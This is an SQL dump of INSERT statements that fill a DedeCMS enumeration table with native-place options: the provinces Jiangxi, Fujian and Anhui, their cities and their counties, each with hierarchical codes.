INSERT INTO dede_sys_enum VALUES ('18159', '万年县', '7511.10', 'nativeplace', '7511', '2');
INSERT INTO dede_sys_enum VALUES ('18158', '鄱阳县', '7511.9', 'nativeplace', '7512', '2');
INSERT INTO dede_sys_enum VALUES ('18157', '余干县', '7511.8', 'nativeplace', '7512', '2');
INSERT INTO dede_sys_enum VALUES ('18156', '弋阳县', '7511.7', 'nativeplace', '7512', '2');
INSERT INTO dede_sys_enum VALUES ('18155', '横峰县', '7511.6', 'nativeplace', '7512', '2');
INSERT INTO dede_sys_enum VALUES ('18154', '铅山县', '7511.5', 'nativeplace', '7512', '2');
INSERT INTO dede_sys_enum VALUES ('18153', '玉山县', '7511.4', 'nativeplace', '7511', '2');
INSERT INTO dede_sys_enum VALUES ('18152', '广丰县', '7511.3', 'nativeplace', '7511', '2');
INSERT INTO dede_sys_enum VALUES ('18151', '上饶县', '7511.2', 'nativeplace', '7511', '2');
INSERT INTO dede_sys_enum VALUES ('18150', '信州区', '7511.1', 'nativeplace', '7511', '2');
INSERT INTO dede_sys_enum VALUES ('18149', '上饶市', '7511', 'nativeplace', '7511', '1');
INSERT INTO dede_sys_enum VALUES ('18148', '广昌县', '7510.11', 'nativeplace', '7510', '2');
INSERT INTO dede_sys_enum VALUES ('18147', '东乡县', '7510.10', 'nativeplace', '7510', '2');
INSERT INTO dede_sys_enum VALUES ('18146', '资溪县', '7510.9', 'nativeplace', '7511', '2');
INSERT INTO dede_sys_enum VALUES ('18145', '金溪县', '7510.8', 'nativeplace', '7511', '2');
INSERT INTO dede_sys_enum VALUES ('18144', '宜黄县', '7510.7', 'nativeplace', '7511', '2');
INSERT INTO dede_sys_enum VALUES ('18143', '乐安县', '7510.6', 'nativeplace', '7511', '2');
INSERT INTO dede_sys_enum VALUES ('18142', '崇仁县', '7510.5', 'nativeplace', '7511', '2');
INSERT INTO dede_sys_enum VALUES ('18141', '南丰县', '7510.4', 'nativeplace', '7510', '2');
INSERT INTO dede_sys_enum VALUES ('18140', '黎川县', '7510.3', 'nativeplace', '7510', '2');
INSERT INTO dede_sys_enum VALUES ('18139', '南城县', '7510.2', 'nativeplace', '7510', '2');
INSERT INTO dede_sys_enum VALUES ('18138', '临川区', '7510.1', 'nativeplace', '7510', '2');
INSERT INTO dede_sys_enum VALUES ('18137', '抚州市', '7510', 'nativeplace', '7510', '1');
INSERT INTO dede_sys_enum VALUES ('18136', '高安市', '7509.10', 'nativeplace', '7509', '2');
INSERT INTO dede_sys_enum VALUES ('18135', '樟树市', '7509.9', 'nativeplace', '7510', '2');
INSERT INTO dede_sys_enum VALUES ('18134', '丰城市', '7509.8', 'nativeplace', '7510', '2');
INSERT INTO dede_sys_enum VALUES ('18133', '铜鼓县', '7509.7', 'nativeplace', '7510', '2');
INSERT INTO dede_sys_enum VALUES ('18132', '靖安县', '7509.6', 'nativeplace', '7510', '2');
INSERT INTO dede_sys_enum VALUES ('18131', '宜丰县', '7509.5', 'nativeplace', '7510', '2');
INSERT INTO dede_sys_enum VALUES ('18130', '上高县', '7509.4', 'nativeplace', '7509', '2');
INSERT INTO dede_sys_enum VALUES ('18129', '万载县', '7509.3', 'nativeplace', '7509', '2');
INSERT INTO dede_sys_enum VALUES ('18128', '奉新县', '7509.2', 'nativeplace', '7509', '2');
INSERT INTO dede_sys_enum VALUES ('18127', '袁州区', '7509.1', 'nativeplace', '7509', '2');
INSERT INTO dede_sys_enum VALUES ('18126', '宜春市', '7509', 'nativeplace', '7509', '1');
INSERT INTO dede_sys_enum VALUES ('18125', '井冈山市', '7508.13', 'nativeplace', '7508', '2');
INSERT INTO dede_sys_enum VALUES ('18124', '永新县', '7508.12', 'nativeplace', '7508', '2');
INSERT INTO dede_sys_enum VALUES ('18123', '安福县', '7508.11', 'nativeplace', '7508', '2');
INSERT INTO dede_sys_enum VALUES ('18122', '万安县', '7508.10', 'nativeplace', '7508', '2');
INSERT INTO dede_sys_enum VALUES ('18121', '遂川县', '7508.9', 'nativeplace', '7509', '2');
INSERT INTO dede_sys_enum VALUES ('18120', '泰和县', '7508.8', 'nativeplace', '7509', '2');
INSERT INTO dede_sys_enum VALUES ('18119', '永丰县', '7508.7', 'nativeplace', '7509', '2');
INSERT INTO dede_sys_enum VALUES ('18118', '新干县', '7508.6', 'nativeplace', '7509', '2');
INSERT INTO dede_sys_enum VALUES ('18117', '峡江县', '7508.5', 'nativeplace', '7509', '2');
INSERT INTO dede_sys_enum VALUES ('18116', '吉水县', '7508.4', 'nativeplace', '7508', '2');
INSERT INTO dede_sys_enum VALUES ('18115', '吉安县', '7508.3', 'nativeplace', '7508', '2');
INSERT INTO dede_sys_enum VALUES ('18114', '青原区', '7508.2', 'nativeplace', '7508', '2');
INSERT INTO dede_sys_enum VALUES ('18113', '吉州区', '7508.1', 'nativeplace', '7508', '2');
INSERT INTO dede_sys_enum VALUES ('18112', '吉安市', '7508', 'nativeplace', '7508', '1');
INSERT INTO dede_sys_enum VALUES ('18111', '南康市', '7507.18', 'nativeplace', '7507', '2');
INSERT INTO dede_sys_enum VALUES ('18110', '瑞金市', '7507.17', 'nativeplace', '7507', '2');
INSERT INTO dede_sys_enum VALUES ('18109', '石城县', '7507.16', 'nativeplace', '7507', '2');
INSERT INTO dede_sys_enum VALUES ('18108', '寻乌县', '7507.15', 'nativeplace', '7507', '2');
INSERT INTO dede_sys_enum VALUES ('18107', '会昌县', '7507.14', 'nativeplace', '7507', '2');
INSERT INTO dede_sys_enum VALUES ('18106', '兴国县', '7507.13', 'nativeplace', '7507', '2');
INSERT INTO dede_sys_enum VALUES ('18105', '于都县', '7507.12', 'nativeplace', '7507', '2');
INSERT INTO dede_sys_enum VALUES ('18104', '宁都县', '7507.11', 'nativeplace', '7507', '2');
INSERT INTO dede_sys_enum VALUES ('18103', '全南县', '7507.10', 'nativeplace', '7507', '2');
INSERT INTO dede_sys_enum VALUES ('18102', '定南县', '7507.9', 'nativeplace', '7508', '2');
INSERT INTO dede_sys_enum VALUES ('18101', '龙南县', '7507.8', 'nativeplace', '7508', '2');
INSERT INTO dede_sys_enum VALUES ('18100', '安远县', '7507.7', 'nativeplace', '7508', '2');
INSERT INTO dede_sys_enum VALUES ('18099', '崇义县', '7507.6', 'nativeplace', '7508', '2');
INSERT INTO dede_sys_enum VALUES ('18098', '上犹县', '7507.5', 'nativeplace', '7508', '2');
INSERT INTO dede_sys_enum VALUES ('18097', '大余县', '7507.4', 'nativeplace', '7507', '2');
INSERT INTO dede_sys_enum VALUES ('18096', '信丰县', '7507.3', 'nativeplace', '7507', '2');
INSERT INTO dede_sys_enum VALUES ('18095', '赣　县', '7507.2', 'nativeplace', '7507', '2');
INSERT INTO dede_sys_enum VALUES ('18094', '章贡区', '7507.1', 'nativeplace', '7507', '2');
INSERT INTO dede_sys_enum VALUES ('18093', '赣州市', '7507', 'nativeplace', '7507', '1');
INSERT INTO dede_sys_enum VALUES ('18092', '贵溪市', '7506.3', 'nativeplace', '7506', '2');
INSERT INTO dede_sys_enum VALUES ('18091', '余江县', '7506.2', 'nativeplace', '7506', '2');
INSERT INTO dede_sys_enum VALUES ('18090', '月湖区', '7506.1', 'nativeplace', '7506', '2');
INSERT INTO dede_sys_enum VALUES ('18089', '鹰潭市', '7506', 'nativeplace', '7506', '1');
INSERT INTO dede_sys_enum VALUES ('18088', '分宜县', '7505.2', 'nativeplace', '7505', '2');
INSERT INTO dede_sys_enum VALUES ('18087', '渝水区', '7505.1', 'nativeplace', '7505', '2');
INSERT INTO dede_sys_enum VALUES ('18086', '新余市', '7505', 'nativeplace', '7505', '1');
INSERT INTO dede_sys_enum VALUES ('18085', '瑞昌市', '7504.12', 'nativeplace', '7504', '2');
INSERT INTO dede_sys_enum VALUES ('18084', '彭泽县', '7504.11', 'nativeplace', '7504', '2');
INSERT INTO dede_sys_enum VALUES ('18083', '湖口县', '7504.10', 'nativeplace', '7504', '2');
INSERT INTO dede_sys_enum VALUES ('18082', '都昌县', '7504.9', 'nativeplace', '7505', '2');
INSERT INTO dede_sys_enum VALUES ('18081', '星子县', '7504.8', 'nativeplace', '7505', '2');
INSERT INTO dede_sys_enum VALUES ('18080', '德安县', '7504.7', 'nativeplace', '7505', '2');
INSERT INTO dede_sys_enum VALUES ('18079', '永修县', '7504.6', 'nativeplace', '7505', '2');
INSERT INTO dede_sys_enum VALUES ('18078', '修水县', '7504.5', 'nativeplace', '7505', '2');
INSERT INTO dede_sys_enum VALUES ('18077', '武宁县', '7504.4', 'nativeplace', '7504', '2');
INSERT INTO dede_sys_enum VALUES ('18076', '九江县', '7504.3', 'nativeplace', '7504', '2');
INSERT INTO dede_sys_enum VALUES ('18075', '浔阳区', '7504.2', 'nativeplace', '7504', '2');
INSERT INTO dede_sys_enum VALUES ('18074', '庐山区', '7504.1', 'nativeplace', '7504', '2');
INSERT INTO dede_sys_enum VALUES ('18073', '九江市', '7504', 'nativeplace', '7504', '1');
INSERT INTO dede_sys_enum VALUES ('18072', '芦溪县', '7503.5', 'nativeplace', '7504', '2');
INSERT INTO dede_sys_enum VALUES ('18071', '上栗县', '7503.4', 'nativeplace', '7503', '2');
INSERT INTO dede_sys_enum VALUES ('18070', '莲花县', '7503.3', 'nativeplace', '7503', '2');
INSERT INTO dede_sys_enum VALUES ('18069', '湘东区', '7503.2', 'nativeplace', '7503', '2');
INSERT INTO dede_sys_enum VALUES ('18068', '安源区', '7503.1', 'nativeplace', '7503', '2');
INSERT INTO dede_sys_enum VALUES ('18067', '萍乡市', '7503', 'nativeplace', '7503', '1');
INSERT INTO dede_sys_enum VALUES ('18066', '乐平市', '7502.4', 'nativeplace', '7502', '2');
INSERT INTO dede_sys_enum VALUES ('18065', '浮梁县', '7502.3', 'nativeplace', '7502', '2');
INSERT INTO dede_sys_enum VALUES ('18064', '珠山区', '7502.2', 'nativeplace', '7502', '2');
INSERT INTO dede_sys_enum VALUES ('18063', '昌江区', '7502.1', 'nativeplace', '7502', '2');
INSERT INTO dede_sys_enum VALUES ('18062', '景德镇市', '7502', 'nativeplace', '7502', '1');
INSERT INTO dede_sys_enum VALUES ('18061', '进贤县', '7501.9', 'nativeplace', '7502', '2');
INSERT INTO dede_sys_enum VALUES ('18060', '安义县', '7501.8', 'nativeplace', '7502', '2');
INSERT INTO dede_sys_enum VALUES ('18059', '新建县', '7501.7', 'nativeplace', '7502', '2');
INSERT INTO dede_sys_enum VALUES ('18058', '南昌县', '7501.6', 'nativeplace', '7502', '2');
INSERT INTO dede_sys_enum VALUES ('18057', '青山湖区', '7501.5', 'nativeplace', '7502', '2');
INSERT INTO dede_sys_enum VALUES ('18056', '湾里区', '7501.4', 'nativeplace', '7501', '2');
INSERT INTO dede_sys_enum VALUES ('18055', '青云谱区', '7501.3', 'nativeplace', '7501', '2');
INSERT INTO dede_sys_enum VALUES ('18054', '西湖区', '7501.2', 'nativeplace', '7501', '2');
INSERT INTO dede_sys_enum VALUES ('18053', '东湖区', '7501.1', 'nativeplace', '7501', '2');
INSERT INTO dede_sys_enum VALUES ('18052', '南昌市', '7501', 'nativeplace', '7501', '1');
INSERT INTO dede_sys_enum VALUES ('18051', '江西省', '7500', 'nativeplace', '7500', '0');
INSERT INTO dede_sys_enum VALUES ('18050', '福鼎市', '7009.9', 'nativeplace', '7010', '2');
INSERT INTO dede_sys_enum VALUES ('18049', '福安市', '7009.8', 'nativeplace', '7010', '2');
INSERT INTO dede_sys_enum VALUES ('18048', '柘荣县', '7009.7', 'nativeplace', '7010', '2');
INSERT INTO dede_sys_enum VALUES ('18047', '周宁县', '7009.6', 'nativeplace', '7010', '2');
INSERT INTO dede_sys_enum VALUES ('18046', '寿宁县', '7009.5', 'nativeplace', '7010', '2');
INSERT INTO dede_sys_enum VALUES ('18045', '屏南县', '7009.4', 'nativeplace', '7009', '2');
INSERT INTO dede_sys_enum VALUES ('18044', '古田县', '7009.3', 'nativeplace', '7009', '2');
INSERT INTO dede_sys_enum VALUES ('18043', '霞浦县', '7009.2', 'nativeplace', '7009', '2');
INSERT INTO dede_sys_enum VALUES ('18042', '蕉城区', '7009.1', 'nativeplace', '7009', '2');
INSERT INTO dede_sys_enum VALUES ('18041', '宁德市', '7009', 'nativeplace', '7009', '1');
INSERT INTO dede_sys_enum VALUES ('18040', '漳平市', '7008.7', 'nativeplace', '7009', '2');
INSERT INTO dede_sys_enum VALUES ('18039', '连城县', '7008.6', 'nativeplace', '7009', '2');
INSERT INTO dede_sys_enum VALUES ('18038', '武平县', '7008.5', 'nativeplace', '7009', '2');
INSERT INTO dede_sys_enum VALUES ('18037', '上杭县', '7008.4', 'nativeplace', '7008', '2');
INSERT INTO dede_sys_enum VALUES ('18036', '永定县', '7008.3', 'nativeplace', '7008', '2');
INSERT INTO dede_sys_enum VALUES ('18035', '长汀县', '7008.2', 'nativeplace', '7008', '2');
INSERT INTO dede_sys_enum VALUES ('18034', '新罗区', '7008.1', 'nativeplace', '7008', '2');
INSERT INTO dede_sys_enum VALUES ('18033', '龙岩市', '7008', 'nativeplace', '7008', '1');
INSERT INTO dede_sys_enum VALUES ('18032', '建阳市', '7007.10', 'nativeplace', '7007', '2');
INSERT INTO dede_sys_enum VALUES ('18031', '建瓯市', '7007.9', 'nativeplace', '7008', '2');
INSERT INTO dede_sys_enum VALUES ('18030', '武夷山市', '7007.8', 'nativeplace', '7008', '2');
INSERT INTO dede_sys_enum VALUES ('18029', '邵武市', '7007.7', 'nativeplace', '7008', '2');
INSERT INTO dede_sys_enum VALUES ('18028', '政和县', '7007.6', 'nativeplace', '7008', '2');
INSERT INTO dede_sys_enum VALUES ('18027', '松溪县', '7007.5', 'nativeplace', '7008', '2');
INSERT INTO dede_sys_enum VALUES ('18026', '光泽县', '7007.4', 'nativeplace', '7007', '2');
INSERT INTO dede_sys_enum VALUES ('18025', '浦城县', '7007.3', 'nativeplace', '7007', '2');
INSERT INTO dede_sys_enum VALUES ('18024', '顺昌县', '7007.2', 'nativeplace', '7007', '2');
INSERT INTO dede_sys_enum VALUES ('18023', '延平区', '7007.1', 'nativeplace', '7007', '2');
INSERT INTO dede_sys_enum VALUES ('18022', '南平市', '7007', 'nativeplace', '7007', '1');
INSERT INTO dede_sys_enum VALUES ('18021', '龙海市', '7006.11', 'nativeplace', '7006', '2');
INSERT INTO dede_sys_enum VALUES ('18020', '华安县', '7006.10', 'nativeplace', '7006', '2');
INSERT INTO dede_sys_enum VALUES ('18019', '平和县', '7006.9', 'nativeplace', '7007', '2');
INSERT INTO dede_sys_enum VALUES ('18018', '南靖县', '7006.8', 'nativeplace', '7007', '2');
INSERT INTO dede_sys_enum VALUES ('18017', '东山县', '7006.7', 'nativeplace', '7007', '2');
INSERT INTO dede_sys_enum VALUES ('18016', '长泰县', '7006.6', 'nativeplace', '7007', '2');
INSERT INTO dede_sys_enum VALUES ('18015', '诏安县', '7006.5', 'nativeplace', '7007', '2');
INSERT INTO dede_sys_enum VALUES ('18014', '漳浦县', '7006.4', 'nativeplace', '7006', '2');
INSERT INTO dede_sys_enum VALUES ('18013', '云霄县', '7006.3', 'nativeplace', '7006', '2');
INSERT INTO dede_sys_enum VALUES ('18012', '龙文区', '7006.2', 'nativeplace', '7006', '2');
INSERT INTO dede_sys_enum VALUES ('18011', '芗城区', '7006.1', 'nativeplace', '7006', '2');
INSERT INTO dede_sys_enum VALUES ('18010', '漳州市', '7006', 'nativeplace', '7006', '1');
INSERT INTO dede_sys_enum VALUES ('18009', '南安市', '7005.12', 'nativeplace', '7005', '2');
INSERT INTO dede_sys_enum VALUES ('18008', '晋江市', '7005.11', 'nativeplace', '7005', '2');
INSERT INTO dede_sys_enum VALUES ('18007', '石狮市', '7005.10', 'nativeplace', '7005', '2');
INSERT INTO dede_sys_enum VALUES ('18006', '金门县', '7005.9', 'nativeplace', '7006', '2');
INSERT INTO dede_sys_enum VALUES ('18005', '德化县', '7005.8', 'nativeplace', '7006', '2');
INSERT INTO dede_sys_enum VALUES ('18004', '永春县', '7005.7', 'nativeplace', '7006', '2');
INSERT INTO dede_sys_enum VALUES ('18003', '安溪县', '7005.6', 'nativeplace', '7006', '2');
INSERT INTO dede_sys_enum VALUES ('18002', '惠安县', '7005.5', 'nativeplace', '7006', '2');
INSERT INTO dede_sys_enum VALUES ('18001', '泉港区', '7005.4', 'nativeplace', '7005', '2');
INSERT INTO dede_sys_enum VALUES ('18000', '洛江区', '7005.3', 'nativeplace', '7005', '2');
INSERT INTO dede_sys_enum VALUES ('17999', '丰泽区', '7005.2', 'nativeplace', '7005', '2');
INSERT INTO dede_sys_enum VALUES ('17998', '鲤城区', '7005.1', 'nativeplace', '7005', '2');
INSERT INTO dede_sys_enum VALUES ('17997', '泉州市', '7005', 'nativeplace', '7005', '1');
INSERT INTO dede_sys_enum VALUES ('17996', '永安市', '7004.12', 'nativeplace', '7004', '2');
INSERT INTO dede_sys_enum VALUES ('17995', '建宁县', '7004.11', 'nativeplace', '7004', '2');
INSERT INTO dede_sys_enum VALUES ('17994', '泰宁县', '7004.10', 'nativeplace', '7004', '2');
INSERT INTO dede_sys_enum VALUES ('17993', '将乐县', '7004.9', 'nativeplace', '7005', '2');
INSERT INTO dede_sys_enum VALUES ('17992', '沙　县', '7004.8', 'nativeplace', '7005', '2');
INSERT INTO dede_sys_enum VALUES ('17991', '尤溪县', '7004.7', 'nativeplace', '7005', '2');
INSERT INTO dede_sys_enum VALUES ('17990', '大田县', '7004.6', 'nativeplace', '7005', '2');
INSERT INTO dede_sys_enum VALUES ('17989', '宁化县', '7004.5', 'nativeplace', '7005', '2');
INSERT INTO dede_sys_enum VALUES ('17988', '清流县', '7004.4', 'nativeplace', '7004', '2');
INSERT INTO dede_sys_enum VALUES ('17987', '明溪县', '7004.3', 'nativeplace', '7004', '2');
INSERT INTO dede_sys_enum VALUES ('17986', '三元区', '7004.2', 'nativeplace', '7004', '2');
INSERT INTO dede_sys_enum VALUES ('17985', '梅列区', '7004.1', 'nativeplace', '7004', '2');
INSERT INTO dede_sys_enum VALUES ('17984', '三明市', '7004', 'nativeplace', '7004', '1');
INSERT INTO dede_sys_enum VALUES ('17983', '仙游县', '7003.5', 'nativeplace', '7004', '2');
INSERT INTO dede_sys_enum VALUES ('17982', '秀屿区', '7003.4', 'nativeplace', '7003', '2');
INSERT INTO dede_sys_enum VALUES ('17981', '荔城区', '7003.3', 'nativeplace', '7003', '2');
INSERT INTO dede_sys_enum VALUES ('17980', '涵江区', '7003.2', 'nativeplace', '7003', '2');
INSERT INTO dede_sys_enum VALUES ('17979', '城厢区', '7003.1', 'nativeplace', '7003', '2');
INSERT INTO dede_sys_enum VALUES ('17978', '莆田市', '7003', 'nativeplace', '7003', '1');
INSERT INTO dede_sys_enum VALUES ('17977', '翔安区', '7002.6', 'nativeplace', '7003', '2');
INSERT INTO dede_sys_enum VALUES ('17976', '同安区', '7002.5', 'nativeplace', '7003', '2');
INSERT INTO dede_sys_enum VALUES ('17975', '集美区', '7002.4', 'nativeplace', '7002', '2');
INSERT INTO dede_sys_enum VALUES ('17974', '湖里区', '7002.3', 'nativeplace', '7002', '2');
INSERT INTO dede_sys_enum VALUES ('17973', '海沧区', '7002.2', 'nativeplace', '7002', '2');
INSERT INTO dede_sys_enum VALUES ('17972', '思明区', '7002.1', 'nativeplace', '7002', '2');
INSERT INTO dede_sys_enum VALUES ('17971', '厦门市', '7002', 'nativeplace', '7002', '1');
INSERT INTO dede_sys_enum VALUES ('17970', '长乐市', '7001.13', 'nativeplace', '7001', '2');
INSERT INTO dede_sys_enum VALUES ('17969', '福清市', '7001.12', 'nativeplace', '7001', '2');
INSERT INTO dede_sys_enum VALUES ('17968', '平潭县', '7001.11', 'nativeplace', '7001', '2');
INSERT INTO dede_sys_enum VALUES ('17967', '永泰县', '7001.10', 'nativeplace', '7001', '2');
INSERT INTO dede_sys_enum VALUES ('17966', '闽清县', '7001.9', 'nativeplace', '7002', '2');
INSERT INTO dede_sys_enum VALUES ('17965', '罗源县', '7001.8', 'nativeplace', '7002', '2');
INSERT INTO dede_sys_enum VALUES ('17964', '连江县', '7001.7', 'nativeplace', '7002', '2');
INSERT INTO dede_sys_enum VALUES ('17963', '闽侯县', '7001.6', 'nativeplace', '7002', '2');
INSERT INTO dede_sys_enum VALUES ('17962', '晋安区', '7001.5', 'nativeplace', '7002', '2');
INSERT INTO dede_sys_enum VALUES ('17961', '马尾区', '7001.4', 'nativeplace', '7001', '2');
INSERT INTO dede_sys_enum VALUES ('17960', '仓山区', '7001.3', 'nativeplace', '7001', '2');
INSERT INTO dede_sys_enum VALUES ('17959', '台江区', '7001.2', 'nativeplace', '7001', '2');
INSERT INTO dede_sys_enum VALUES ('17958', '鼓楼区', '7001.1', 'nativeplace', '7001', '2');
INSERT INTO dede_sys_enum VALUES ('17957', '福州市', '7001', 'nativeplace', '7001', '1');
INSERT INTO dede_sys_enum VALUES ('17956', '福建省', '7000', 'nativeplace', '7000', '0');
INSERT INTO dede_sys_enum VALUES ('17955', '宁国市', '6517.7', 'nativeplace', '6518', '2');
INSERT INTO dede_sys_enum VALUES ('17954', '旌德县', '6517.6', 'nativeplace', '6518', '2');
INSERT INTO dede_sys_enum VALUES ('17953', '绩溪县', '6517.5', 'nativeplace', '6518', '2');
INSERT INTO dede_sys_enum VALUES ('17952', '泾　县', '6517.4', 'nativeplace', '6517', '2');
INSERT INTO dede_sys_enum VALUES ('17951', '广德县', '6517.3', 'nativeplace', '6517', '2');
INSERT INTO dede_sys_enum VALUES ('17950', '郎溪县', '6517.2', 'nativeplace', '6517', '2');
INSERT INTO dede_sys_enum VALUES ('17949', '宣州区', '6517.1', 'nativeplace', '6517', '2');
INSERT INTO dede_sys_enum VALUES ('17948', '宣城市', '6517', 'nativeplace', '6517', '1');
INSERT INTO dede_sys_enum VALUES ('17947', '青阳县', '6516.4', 'nativeplace', '6516', '2');
INSERT INTO dede_sys_enum VALUES ('17946', '石台县', '6516.3', 'nativeplace', '6516', '2');
INSERT INTO dede_sys_enum VALUES ('17945', '东至县', '6516.2', 'nativeplace', '6516', '2');
INSERT INTO dede_sys_enum VALUES ('17944', '贵池区', '6516.1', 'nativeplace', '6516', '2');
INSERT INTO dede_sys_enum VALUES ('17943', '池州市', '6516', 'nativeplace', '6516', '1');
INSERT INTO dede_sys_enum VALUES ('17942', '利辛县', '6515.4', 'nativeplace', '6515', '2');
INSERT INTO dede_sys_enum VALUES ('17941', '蒙城县', '6515.3', 'nativeplace', '6515', '2');
INSERT INTO dede_sys_enum VALUES ('17940', '涡阳县', '6515.2', 'nativeplace', '6515', '2');
INSERT INTO dede_sys_enum VALUES ('17939', '谯城区', '6515.1', 'nativeplace', '6515', '2');
INSERT INTO dede_sys_enum VALUES ('17938', '亳州市', '6515', 'nativeplace', '6515', '1');
INSERT INTO dede_sys_enum VALUES ('17937', '霍山县', '6514.7', 'nativeplace', '6515', '2');
INSERT INTO dede_sys_enum VALUES ('17936', '金寨县', '6514.6', 'nativeplace', '6515', '2');
INSERT INTO dede_sys_enum VALUES ('17935', '舒城县', '6514.5', 'nativeplace', '6515', '2');
INSERT INTO dede_sys_enum VALUES ('17934', '霍邱县', '6514.4', 'nativeplace', '6514', '2');
INSERT INTO dede_sys_enum VALUES ('17933', '寿　县', '6514.3', 'nativeplace', '6514', '2');
INSERT INTO dede_sys_enum VALUES ('17932', '裕安区', '6514.2', 'nativeplace', '6514', '2');
INSERT INTO dede_sys_enum VALUES ('17931', '金安区', '6514.1', 'nativeplace', '6514', '2');
INSERT INTO dede_sys_enum VALUES ('17930', '六安市', '6514', 'nativeplace', '6514', '1');
INSERT INTO dede_sys_enum VALUES ('17929', '和　县', '6513.5', 'nativeplace', '6514', '2');
INSERT INTO dede_sys_enum VALUES ('17928', '含山县', '6513.4', 'nativeplace', '6513', '2');
INSERT INTO dede_sys_enum VALUES ('17927', '无为县', '6513.3', 'nativeplace', '6513', '2');
INSERT INTO dede_sys_enum VALUES ('17926', '庐江县', '6513.2', 'nativeplace', '6513', '2');
INSERT INTO dede_sys_enum VALUES ('17925', '居巢区', '6513.1', 'nativeplace', '6513', '2');
INSERT INTO dede_sys_enum VALUES ('17924', '巢湖市', '6513', 'nativeplace', '6513', '1');
INSERT INTO dede_sys_enum VALUES ('17923', '泗　县', '6512.5', 'nativeplace', '6513', '2');
INSERT INTO dede_sys_enum VALUES ('17922', '灵璧县', '6512.4', 'nativeplace', '6512', '2');
INSERT INTO dede_sys_enum VALUES ('17921', '萧　县', '6512.3', 'nativeplace', '6512', '2');
INSERT INTO dede_sys_enum VALUES ('17920', '砀山县', '6512.2', 'nativeplace', '6512', '2');
INSERT INTO dede_sys_enum VALUES ('17919', '墉桥区', '6512.1', 'nativeplace', '6512', '2');
INSERT INTO dede_sys_enum VALUES ('17918', '宿州市', '6512', 'nativeplace', '6512', '1');
INSERT INTO dede_sys_enum VALUES ('17917', '界首市', '6511.8', 'nativeplace', '6512', '2');
INSERT INTO dede_sys_enum VALUES ('17916', '颍上县', '6511.7', 'nativeplace', '6512', '2');
INSERT INTO dede_sys_enum VALUES ('17915', '阜南县', '6511.6', 'nativeplace', '6512', '2');
INSERT INTO dede_sys_enum VALUES ('17914', '太和县', '6511.5', 'nativeplace', '6512', '2');
INSERT INTO dede_sys_enum VALUES ('17913', '临泉县', '6511.4', 'nativeplace', '6511', '2');
INSERT INTO dede_sys_enum VALUES ('17912', '颍泉区', '6511.3', 'nativeplace', '6511', '2');
INSERT INTO dede_sys_enum VALUES ('17911', '颍东区', '6511.2', 'nativeplace', '6511', '2');
INSERT INTO dede_sys_enum VALUES ('17910', '颍州区', '6511.1', 'nativeplace', '6511', '2');
INSERT INTO dede_sys_enum VALUES ('17909', '阜阳市', '6511', 'nativeplace', '6511', '1');
INSERT INTO dede_sys_enum VALUES ('17908', '明光市', '6510.8', 'nativeplace', '6511', '2');
INSERT INTO dede_sys_enum VALUES ('17907', '天长市', '6510.7', 'nativeplace', '6511', '2');
INSERT INTO dede_sys_enum VALUES ('17906', '凤阳县', '6510.6', 'nativeplace', '6511', '2');
INSERT INTO dede_sys_enum VALUES ('17905', '定远县', '6510.5', 'nativeplace', '6511', '2');
INSERT INTO dede_sys_enum VALUES ('17904', '全椒县', '6510.4', 'nativeplace', '6510', '2');
INSERT INTO dede_sys_enum VALUES ('17903', '来安县', '6510.3', 'nativeplace', '6510', '2');
INSERT INTO dede_sys_enum VALUES ('17902', '南谯区', '6510.2', 'nativeplace', '6510', '2');
INSERT INTO dede_sys_enum VALUES ('17901', '琅琊区', '6510.1', 'nativeplace', '6510', '2');
INSERT INTO dede_sys_enum VALUES ('17900', '滁州市', '6510', 'nativeplace', '6510', '1');
INSERT INTO dede_sys_enum VALUES ('17899', '祁门县', '6509.7', 'nativeplace', '6510', '2');
INSERT INTO dede_sys_enum VALUES ('17898', '黟　县', '6509.6', 'nativeplace', '6510', '2');
INSERT INTO dede_sys_enum VALUES ('17897', '休宁县', '6509.5', 'nativeplace', '6510', '2');
INSERT INTO dede_sys_enum VALUES ('17896', '歙　县', '6509.4', 'nativeplace', '6509', '2');
INSERT INTO dede_sys_enum VALUES ('17895', '徽州区', '6509.3', 'nativeplace', '6509', '2');
INSERT INTO dede_sys_enum VALUES ('17894', '黄山区', '6509.2', 'nativeplace', '6509', '2');
INSERT INTO dede_sys_enum VALUES ('17893', '屯溪区', '6509.1', 'nativeplace', '6509', '2');
INSERT INTO dede_sys_enum VALUES ('17892', '黄山市', '6509', 'nativeplace', '6509', '1');
INSERT INTO dede_sys_enum VALUES ('17891', '桐城市', '6508.11', 'nativeplace', '6508', '2');
INSERT INTO dede_sys_enum VALUES ('17890', '岳西县', '6508.10', 'nativeplace', '6508', '2');
INSERT INTO dede_sys_enum VALUES ('17889', '望江县', '6508.9', 'nativeplace', '6509', '2');
INSERT INTO dede_sys_enum VALUES ('17888', '宿松县', '6508.8', 'nativeplace', '6509', '2');
INSERT INTO dede_sys_enum VALUES ('17887', '太湖县', '6508.7', 'nativeplace', '6509', '2');
INSERT INTO dede_sys_enum VALUES ('17886', '潜山县', '6508.6', 'nativeplace', '6509', '2');
INSERT INTO dede_sys_enum VALUES ('17885', '枞阳县', '6508.5', 'nativeplace', '6509', '2');
INSERT INTO dede_sys_enum VALUES ('17884', '怀宁县', '6508.4', 'nativeplace', '6508', '2');
INSERT INTO dede_sys_enum VALUES ('17883', '郊　区', '6508.3', 'nativeplace', '6508', '2');
INSERT INTO dede_sys_enum VALUES ('17882', '大观区', '6508.2', 'nativeplace', '6508', '2');
INSERT INTO dede_sys_enum VALUES ('17881', '迎江区', '6508.1', 'nativeplace', '6508', '2');
INSERT INTO dede_sys_enum VALUES ('17880', '安庆市', '6508', 'nativeplace', '6508', '1');
INSERT INTO dede_sys_enum VALUES ('17879', '铜陵县', '6507.4', 'nativeplace', '6507', '2');
INSERT INTO dede_sys_enum VALUES ('17878', '郊　区', '6507.3', 'nativeplace', '6507', '2');
INSERT INTO dede_sys_enum VALUES ('17877', '狮子山区', '6507.2', 'nativeplace', '6507', '2');
INSERT INTO dede_sys_enum VALUES ('17876', '铜官山区', '6507.1', 'nativeplace', '6507', '2');
INSERT INTO dede_sys_enum VALUES ('17875', '铜陵市', '6507', 'nativeplace', '6507', '1');
INSERT INTO dede_sys_enum VALUES ('17874', '濉溪县', '6506.4', 'nativeplace', '6506', '2');
INSERT INTO dede_sys_enum VALUES ('17873', '烈山区', '6506.3', 'nativeplace', '6506', '2');
INSERT INTO dede_sys_enum VALUES ('17872', '相山区', '6506.2', 'nativeplace', '6506', '2');
INSERT INTO dede_sys_enum VALUES ('17871', '杜集区', '6506.1', 'nativeplace', '6506', '2');
INSERT INTO dede_sys_enum VALUES ('17870', '淮北市', '6506', 'nativeplace', '6506', '1');
